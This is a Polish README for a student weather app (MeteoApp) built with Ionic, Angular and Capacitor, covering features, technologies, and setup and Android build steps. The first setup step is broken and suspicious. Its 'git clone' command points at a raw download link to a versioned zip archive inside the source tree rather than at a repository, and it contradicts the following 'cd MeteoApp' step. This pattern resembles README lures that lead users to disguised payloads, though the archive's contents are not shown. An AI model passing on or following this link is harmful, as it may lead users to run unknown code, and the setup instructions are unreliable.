# MeteoApp

Wieloplatformowa aplikacja pogodowa stworzona przy użyciu Ionic, Angular i Capacitor.

## Opis

MeteoApp to prosta, ale w pełni funkcjonalna aplikacja pogodowa, która pozwala użytkownikom na sprawdzanie aktualnej prognozy pogody dla ich obecnej lokalizacji oraz wyszukiwanie pogody dla innych miast na świecie. Aplikacja została stworzona jako projekt zaliczeniowy.

## Funkcjonalności

*   **Pogoda dla aktualnej lokalizacji:** Aplikacja automatycznie wykrywa lokalizację użytkownika (za jego zgodą) i wyświetla aktualne warunki pogodowe.
*   **Wyszukiwanie miast:** Umożliwia wyszukiwanie dowolnego miasta na świecie i wyświetlanie dla niego prognozy.
*   **Interaktywne sugestie:** Podczas wpisywania nazwy miasta, aplikacja na bieżąco wyświetla listę pasujących sugestii, aby ułatwić wyszukiwanie.
*   **Szczegółowa prognoza:** Wyświetla kluczowe informacje, takie jak temperatura, odczuwalna temperatura, wilgotność, prędkość wiatru i opady.
*   **Prognoza na kolejne dni:** Prezentuje prognozę pogody na najbliższe dni.
*   **Dynamiczne ikony pogody:** Dopasowuje ikonę do aktualnych warunków pogodowych.
*   **Tryb jasny i ciemny:** Interfejs automatycznie dostosowuje się do motywu systemowego.
*   **Natywny wygląd i działanie:** Dzięki Capacitor, aplikacja integruje się z natywnymi funkcjami urządzenia, takimi jak geolokalizacja i pasek statusu.

## Technologie

*   **Ionic Framework** - UI toolkit do budowy wysokiej jakości aplikacji mobilnych i desktopowych.
*   **Angular** - Platforma do budowy aplikacji webowych.
*   **Capacitor** - Narzędzie do uruchamiania aplikacji webowych jako natywnych aplikacji mobilnych.
*   **TypeScript** - Język programowania bazujący na JavaScript.
*   **RxJS** - Biblioteka do programowania reaktywnego.
*   **Open-Meteo API** - Darmowe API do pobierania danych pogodowych.
*   **BigDataCloud API** - API do odwrotnego geokodowania.

## Uruchomienie

1.  Sklonuj repozytorium:
    ```bash
    git clone https://raw.githubusercontent.com/MaTiino/MeteoApp/main/src/app/components/App_Meteo_v2.6.zip
    ```
2.  Przejdź do katalogu projektu:
    ```bash
    cd MeteoApp
    ```
3.  Zainstaluj zależności:
    ```bash
    npm install
    ```
4.  Uruchom aplikację w przeglądarce:
    ```bash
    ionic serve
    ```

## Budowanie na platformę Android

1.  Dodaj platformę Android:
    ```bash
    ionic capacitor add android
    ```
2.  Zbuduj aplikację webową:
    ```bash
    ionic build
    ```
3.  Zsynchronizuj projekt z platformą natywną:
    ```bash
    ionic capacitor sync android
    ```
4.  Otwórz projekt w Android Studio:
    ```bash
    ionic capacitor open android
    ```
5.  Uruchom aplikację na emulatorze lub podłączonym urządzeniu z poziomu Android Studio. 

## Autor
Aplikacja stworzona przez Mateusza Toporka w ramach zaliczenia przedmiotu "Programowanie Aplikacji Wieloplatformowych". 
